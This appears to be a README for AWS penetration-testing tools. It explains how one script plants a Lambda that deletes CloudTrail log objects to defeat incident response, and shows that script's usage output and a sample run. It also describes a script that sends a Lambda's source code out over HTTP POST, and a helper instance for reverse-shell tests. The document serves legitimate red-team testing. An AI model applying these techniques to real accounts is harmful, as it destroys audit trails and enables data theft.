
## AWS-related penetration testing scripts, tools and Cheatsheets

- **`disruptCloudTrailByS3Lambda.py`** - This script attempts to disrupt CloudTrail by planting a Lambda function that will delete every object created in S3 bucket bound to a trail. As soon as CloudTrail creates a new object in S3 bucket, Lambda will kick in and delete that object. No object, no logs. No logs, no Incident Response :-)

One will need to pass AWS credentials to this tool. Also, the account affected should have at least following permissions:
- `iam:CreateRole`
- `iam:CreatePolicy`
- `iam:AttachRolePolicy`
- `lambda:CreateFunction`
- `lambda:AddPermission`
- `s3:PutBucketNotification`

These are the changes to be introduced within a specified AWS account:
- IAM role will be created, by default with name: `cloudtrail_helper_role`
- IAM policy will be created, by default with name: `cloudtrail_helper_policy`
- Lambda function will be created, by default with name: `cloudtrail_helper_function`
- Put Event notification will be configured on affected CloudTrail S3 buckets.

This tool will fail upon first execution with the following exception:

```
[-] Could not create a Lambda function: An error occurred (InvalidParameterValueException) when calling the CreateFunction operation: The role defined for the function cannot be assumed by Lambda.
```

At the moment I did not find an explanation for that, but running the tool again with the same set of parameters - get the job done.

```
bash $ python3 disruptCloudTrailByS3Lambda.py --help

        :: AWS CloudTrail disruption via S3 Put notification to Lambda
        Disrupts AWS CloudTrail logging by planting Lambda that deletes S3 objects upon their creation
        Mariusz B. / mgeeky '19, <mb@binary-offensive.com>

usage: disruptCloudTrailByS3Lambda.py [options] <region> [trail_name]

required arguments:
  region                AWS region to use.
  --access-key ACCESS_KEY
                        AWS Access Key ID
  --secret-key SECRET_KEY
                        AWS Access Key ID
  --token TOKEN         AWS temporary session token

optional arguments:
  trail_name            CloudTrail name that you want to disrupt. If not
                        specified, will disrupt every actively logging trail.
  --disrupt             By default, this tool will install Lambda that is only
                        logging that it could remove S3 objects. By using this
                        switch, there is going to be Lambda introduced that
                        actually deletes objects.
  --role-name ROLE_NAME
                        name for AWS Lambda role
  --policy-name POLICY_NAME
                        name for a policy for that Lambda role
  --function-name FUNCTION_NAME
                        name for AWS Lambda function


bash $ python3 disruptCloudTrailByS3Lambda.py --access-key ASIAXXXXXXXXXXXXXXXX --secret-key Gaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa --token FQoGZX[...] us-west-2

        :: AWS CloudTrail disruption via S3 Put notification to Lambda
        Disrupts AWS CloudTrail logging by planting Lambda that deletes S3 objects upon their creation
        Mariusz B. / mgeeky '19, <mb@binary-offensive.com>

[.] Will be working on Account ID: 712800000000
[.] Step 1: Determine trail to disrupt
[+] Trail cloudgoat_trail is actively logging (multi region? No).
[.] Trails intended to be disrupted:
	- cloudgoat_trail

[.] Step 2: Create a role to be assumed by planted Lambda
[-] Role with name: cloudtrail_helper_role already exists.
[.] Step 3: Create a policy for that role
[-] Policy with name: cloudtrail_helper_policy already exists.
[.] Step 4: Attach policy to the role
[.] Attaching policy (arn:aws:iam::712800000000:policy/cloudtrail_helper_policy) to the role cloudtrail_helper_role
[-] Policy is already attached.
[.] Step 5: Create Lambda function
[.] 	Using non-disruptive lambda.
[.] Creating a lambda function named: cloudtrail_helper_function on Role: arn:aws:iam::712800000000:role/cloudtrail_helper_role
[+] Function created.
[.] Step 6: Permit function to be invoked on all trails
[.] Adding invoke permission to func: cloudtrail_helper_function on S3 bucket: arn:aws:s3:::90112981864022885796153088027941100000000000000000000000
[.] Step 7: Configure trail bucket's put notification
[.] Putting a bucket notification configuration to 90112981864022885796153088027941100000000000000000000000, ARN: arn:aws:lambda:us-west-2:712800000000:function:cloudtrail_helper_function
[+] Installed CloudTrail's S3 bucket disruption Lambda.
```

Afterwards, one should see following logs in CloudWatch traces for planted Lambda function - if no `--disrupt` option was specified:

```
[*] Following S3 object could be removed: (Bucket=90112981864022885796153088027941100000000000000000000000, Key=cloudtrail/AWSLogs/712800000000/CloudTrail/us-west-2/2019/03/20/712800000000_CloudTrail_us-west-2_20190320T1000Z_oxxxxxxxxxxxxc.json.gz)
```

- **`exfiltrateLambdaTasksDirectory.py`** - Script that creates an in-memory ZIP file from the entire directory `$LAMBDA_TASK_ROOT` (typically `/var/task`) and sends it out in a form of HTTP(S) POST request, within an `exfil` parameter. To be used for exfiltrating AWS Lambda's entire source code.

- **`identifyS3Bucket.rb`** - This script attempts to identify passed name whether it resolves to a valid AWS S3 Bucket via different means. This script may come handy when revealing S3 buckets hidden behind HTTP proxies.

- **`pentest-ec2-instance`** - A set of utilities for quick starting, ssh-ing and stopping of a single temporary EC2 instance intended to be used for Web out-of-band tests (SSRF, reverse-shells, dns/http/other daemons).
